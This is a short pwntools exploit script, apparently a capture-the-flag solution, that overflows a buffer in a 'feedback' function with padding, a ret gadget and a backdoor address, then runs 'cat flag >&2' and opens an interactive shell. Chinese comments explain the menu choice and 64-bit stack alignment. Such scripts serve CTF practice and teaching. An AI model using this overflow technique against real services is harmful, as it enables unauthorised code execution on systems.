from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = process('./pwn')
#p = remote('geek.ctfplus.cn',30627)
# 进入feedback函数
p.sendlineafter(b'> ', b'2')
p.recvuntil(b'Please enter your feedback:')
backdoor_addr = 0x4014ab
ret = 0x40101a
# 注意64位要栈对齐
payload = b'A' * 40
payload += p64(ret)
payload += p64(backdoor_addr)
p.send(payload)
# 发送命令将输出重定向到标准错误
p.sendline(b'cat flag >&2')
p.interactive()
